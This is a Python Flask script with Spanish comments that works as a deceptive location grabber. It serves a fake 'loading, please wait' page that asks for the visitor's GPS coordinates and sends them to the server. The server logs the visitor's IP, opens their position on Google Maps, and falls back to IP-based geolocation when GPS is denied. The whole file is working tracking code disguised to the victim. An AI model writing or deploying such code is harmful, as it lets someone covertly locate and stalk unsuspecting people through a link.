from flask import Flask, render_template_string, request, jsonify
import requests
import webbrowser

app = Flask(__name__)

# HTML que se envía al usuario
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Cargando...</title>
</head>
<body>
    <h2>Procesando solicitud, espera un momento...</h2>
    <script>
        window.onload = function() {
            const opciones = { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 };

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    fetch('/capturar', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude
                        })
                    }).then(() => {
                        document.body.innerHTML = "<h1>Información enviada con éxito.</h1>";
                    });
                }, function(error) {
                    alert("Para mayor precisión, permite el acceso a la ubicación.");
                    // Si falla el GPS, avisamos al servidor de todas formas
                    fetch('/capturar', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({lat: null, lon: null}) });
                }, opciones);
            }
        };
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    # Capturamos la IP del usuario que entra (vía Python)
    ip_usuario = request.remote_addr
    print(f"\n[+] Alguien ha entrado desde la IP: {ip_usuario}")
    return render_template_string(HTML_TEMPLATE)

@app.route('/capturar', methods=['POST'])
def capturar():
    datos = request.json
    lat = datos.get('lat')
    lon = datos.get('lon')
    ip = request.remote_addr

    print("\n" + "="*30)
    print(f"[!] ¡DATOS RECIBIDOS!")
    print(f"[+] IP de origen: {ip}")
    
    if lat and lon:
        print(f"[*] GPS (PRECISO): {lat}, {lon}")
        mapa_url = f"https://www.google.com/maps?q={lat},{lon}"
        print(f"[*] Google Maps: {mapa_url}")
        webbrowser.open(mapa_url)
    else:
        print("[*] GPS: No permitido por el usuario.")
        # Intentamos rastreo por IP como alternativa si el GPS falla
        print("[*] Intentando rastreo aproximado por IP...")
        info_ip = requests.get(f"https://ipinfo.io/{ip}/json").json()
        print(f"[*] Ciudad aprox: {info_ip.get('city')}")
    
    print("="*30 + "\n")
    return jsonify({"status": "recibido"})

if __name__ == '__main__':
    # Ejecuta el servidor en el puerto 5000
    app.run(host='0.0.0.0', port=5000, debug=False)